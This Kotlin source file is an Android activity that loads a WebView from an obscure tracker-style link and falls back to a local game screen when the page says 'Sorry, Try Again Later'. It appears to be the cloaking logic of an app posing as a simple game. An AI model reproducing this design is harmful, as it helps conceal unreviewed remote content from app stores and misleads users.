package com.timur.avia.aviaplan

import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.webkit.CookieManager
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar


class Track : AppCompatActivity() {
    private lateinit var wb_bg: WebView
    private lateinit var pb_bg: ProgressBar

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        supportActionBar?.hide()
        setContentView(R.layout.activity_track)

        wb_bg = findViewById(R.id.wb)
        pb_bg = findViewById(R.id.pb)

        setupWebView()
        if (isNetworkAvailable()) {
            loadWebView("https://ysuahv.site/gwcVkn")
        } else {
            redirectToGameActivity()
        }
    }

    override fun onResume() {
        super.onResume()
        wb_bg.onResume()
    }

    override fun onPause() {
        super.onPause()
        wb_bg.onPause()
    }

    override fun onDestroy() {
        super.onDestroy()
        wb_bg.destroy()
    }

    override fun onBackPressed() {
        if (wb_bg.canGoBack()) {
            wb_bg.goBack()
        }
    }

    private fun setupWebView() {
        with(wb_bg.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            builtInZoomControls = true
        }

        wb_bg.webChromeClient = WebChromeClient()
        wb_bg.webViewClient = object : WebViewClient() {
            override fun onPageCommitVisible(view: WebView?, url: String?) {
                super.onPageCommitVisible(view, url)
                pb_bg.visibility = ProgressBar.VISIBLE
                evaluateJavascriptForPage()
            }

            override fun onPageFinished(view: WebView, url: String) {
                CookieManager.getInstance().flush()
                pb_bg.visibility = ProgressBar.GONE
            }

            override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
                return handleExternalUrl(request.url.toString())
            }
        }

        CookieManager.getInstance().apply {
            setAcceptCookie(true)
            setAcceptThirdPartyCookies(wb_bg, true)
        }
    }

    private fun evaluateJavascriptForPage() {
        wb_bg.evaluateJavascript("document.body.innerText") { result ->
            if (result.contains("Sorry, Try Again Later", ignoreCase = true)) {
                redirectToGameActivity()
            }
        }
    }

    private fun handleExternalUrl(url: String): Boolean {
        if (url.startsWith("http://") || url.startsWith("https://")) {
            return false
        }

        startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
        return true
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork
        val capabilities = connectivityManager.getNetworkCapabilities(network)
        return capabilities != null &&
                (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR))
    }

    private fun loadWebView(url: String) {
        wb_bg.loadUrl(url)
    }

    private fun redirectToGameActivity() {
        startActivity(Intent(this, MainActivity::class.java))
        finish()
    }

}